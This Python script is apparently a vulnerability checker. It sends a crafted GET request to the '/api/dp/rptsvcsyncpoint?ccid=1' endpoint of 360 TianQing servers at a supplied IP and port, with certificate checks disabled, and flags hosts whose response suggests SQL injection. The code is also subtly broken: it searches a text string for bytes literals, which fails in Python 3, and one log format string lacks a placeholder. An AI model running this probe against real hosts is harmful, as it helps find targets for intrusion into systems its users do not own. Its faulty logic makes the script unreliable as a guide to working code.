#encoding:utf-8
try:
    import requests,os,logging,sys
    logging.basicConfig(level=logging.INFO,format="%(message)s")
    requests.packages.urllib3.disable_warnings()
except Exception as e:
    logging.info("[*]".format(e))
    os._exit(6)

def check(ip,port):
    try:
        payload = "/api/dp/rptsvcsyncpoint?ccid=1"                                                     
        tar = "https://" + ip + ":" + port + payload
        ssl = requests.session()
        req = ssl.get(tar,timeout=3,verify=False
        )
        if req.status_code == 200:                                                          
            if ( b"result" in req.text ) and ( b"success" in req.text ) and ( b'10001' not in req.text):          
                logging.info(u"[+] {} find 360_TianQing_ccid_SQL_injectable".format(ip))                 
                os._exit(1)

            else :
                logging.info(u"[-] {} do not found 360_TianQing_ccid_SQL_injectable".format(ip))     
                os._exit(2)

        else :
            logging.info(u"[-] {} do not found 360_TianQing_ccid_SQL_injectable".format(ip))                           
            os._exit(2)
    except Exception as e:
        logging.info("[*] {}".format(e))
        os._exit(4)

if __name__ == "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)
